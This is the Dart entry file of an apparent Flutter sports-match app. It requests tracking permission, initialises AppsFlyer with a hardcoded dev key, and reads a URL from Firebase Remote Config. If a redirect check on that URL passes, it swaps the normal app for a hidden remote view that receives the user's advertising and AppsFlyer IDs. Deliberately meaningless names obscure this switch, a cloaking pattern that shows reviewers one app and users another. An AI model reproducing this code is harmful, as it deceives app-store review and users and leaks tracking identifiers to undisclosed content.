import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:match_time/domain/teams_matches_controller.dart';
import 'package:match_time/my_router.dart';
import 'package:match_time/my_theme.dart';
import 'package:match_time/presentation/create_team_screen/create_team_screen.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'presentation/community_screen/configx.dart';
import 'presentation/community_screen/notf.dart';

int? inxSc;
late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String fjsdklfjdslk = '';
String cancelPromo = '';
String fndsjkfndsklfs = '';
String appsflyerId = '';
String advertisingId = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String aff = '';
String _campaign = '';
String _campaignId = '';
late SharedPreferences prxs;
final configMyMatches = FirebaseRemoteConfig.instance;
late SharedPreferences preferencix;
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await showRate();
  SharedPreferences preferences = await SharedPreferences.getInstance();
  await Firebase.initializeApp(options: MyMatchesLoadFromCache.currentPlatform);
  await configMyMatches.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 3),
    minimumFetchInterval: const Duration(seconds: 3),
  ));
  await CheckNewMatches().activate();
  await nfjkdsfkds();
  final teamsMatchesController = TeamsMatchesController(preferences)..init();
  runApp(MyApp(teamsMatchesController: teamsMatchesController));
}

Future<void> nfjkdsfkds() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  String adv = await AppTrackingTransparency.getAdvertisingIdentifier();
  advertisingId = adv;
  print(status);
}

late SharedPreferences prefers;
final rateCallView = InAppReview.instance;
Future<void> getRatingFromCache() async {
  prefers = await SharedPreferences.getInstance();
}

Future<void> showRate() async {
  await getRatingFromCache();
  bool rateStated = prefers.getBool('rateOur') ?? false;
  if (!rateStated) {
    if (await rateCallView.isAvailable()) {
      rateCallView.requestReview();
      await prefers.setBool('rateOur', true);
    }
  }
}

class MyApp extends StatefulWidget {
  const MyApp({super.key, required this.teamsMatchesController});
  final TeamsMatchesController teamsMatchesController;

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
    fsdfdsgdf();
  }

  Future<void> fsdfdsgdf() async {
    await nfjkdsfkds();
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '36A2YtCrzbPFe9egufGekG',
      appId: '6475717206',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    _appsflyerSdk = AppsflyerSdk(options);

    await _appsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    _appsflyerSdk.onAppOpenAttribution((res) {
      _deepLinkData = res;
      cancelPromo = res['payload']
          .entries
          .where((e) => ![
                'install_time',
                'click_time',
                'af_status',
                'is_first_launch'
              ].contains(e.key))
          .map((e) => '&${e.key}=${e.value}')
          .join();
    });

    _appsflyerSdk.onInstallConversionData((res) {
      _gcd = res;
      _isFirstLaunch = res['payload']['is_first_launch'];
      _afStatus = res['payload']['af_status'];
      setState(() {
        aff = _afStatus;
      });
      fjsdklfjdslk = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
    });

    _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
      switch (dp.status) {
        case Status.FOUND:
          print(dp.deepLink?.toString());
          print("deep link value: ${dp.deepLink?.deepLinkValue}");
          break;
        case Status.NOT_FOUND:
          print("deep link not found");
          break;
        case Status.ERROR:
          print("deep link error: ${dp.error}");
          break;
        case Status.PARSE_ERROR:
          print("deep link status parsing error");
          break;
      }
      print("onDeepLinking res: " + dp.toString());

      _deepLinkData = dp.toJson();
    });
    _appsflyerSdk.startSDK(
      onSuccess: () async {
        print("AppsFlyer SDK initialized successfully.");
        await getAppsFlyerId();
      },
    );
  }

  Future<void> getAppsFlyerId() async {
    try {
      appsflyerId = await _appsflyerSdk.getAppsFlyerUID() ?? '';

      print("AppsFlyer ID: $appsflyerId");
    } catch (e) {
      print("Failed to get AppsFlyer ID: $e");
    }
  }

  final remoteConfig = FirebaseRemoteConfig.instance;
  String ixg = '';

  Future<Map<String, dynamic>> _initializeApp() async {
    await fsdfdsgdf();
    getAppsFlyerId();
    bool showMatchesLive = await fetchLiveMatchesView();

    return {
      'showMatchesLive': showMatchesLive,
      'appsflyerId': appsflyerId,
      'afStatus': _afStatus,
      'advertisingId': advertisingId,
    };
  }

  Future<bool> fetchLiveMatchesView() async {
    try {
      await remoteConfig.fetchAndActivate();
      final String dsdafsdxws = remoteConfig.getString('MatchPro');
      ixg = remoteConfig.getString('MatchProRed');

      if (dsdafsdxws.contains('noneMatches')) {
        return false;
      } else {
        leagueInition = await checkLiveMatchesView(dsdafsdxws);
        if (leagueInition != '') return true;
        return false;
      }
    } catch (e) {
      return false;
    }
  }

  Future<String> checkLiveMatchesView(String loands) async {
    final client = HttpClient();
    var uri = Uri.parse(loands);
    var request = await client.getUrl(uri);
    request.followRedirects = false;
    var response = await request.close();
    if (response.headers
        .value(HttpHeaders.locationHeader)
        .toString()
        .contains(ixg)) {
      return '';
    } else {
      return loands;
    }
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<Map<String, dynamic>>(
      future: _initializeApp(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.done) {
          if (snapshot.data!['showMatchesLive']) {
            return ShowMatchesLive(
              league: leagueInition,
              appsflyerId: '&appsflyer_id=${snapshot.data!['appsflyerId']}',
              type: '&afStatus=${snapshot.data!['afStatus']}',
              advId: '&advertisingId=${snapshot.data!['advertisingId']}',
            );
          } else {
            return ChangeNotifierProvider.value(
              value: widget.teamsMatchesController,
              child: MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: MyTheme.theme,
                routerConfig: MyRouter.router,
              ),
            );
          }
        } else {
          return Container(
            color: Colors.white,
            child: Center(
              child: Container(
                height: 80,
                width: 80,
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(10),
                  child: Image.asset('images/logo.png'),
                ),
              ),
            ),
          );
        }
      },
    );
  }
}
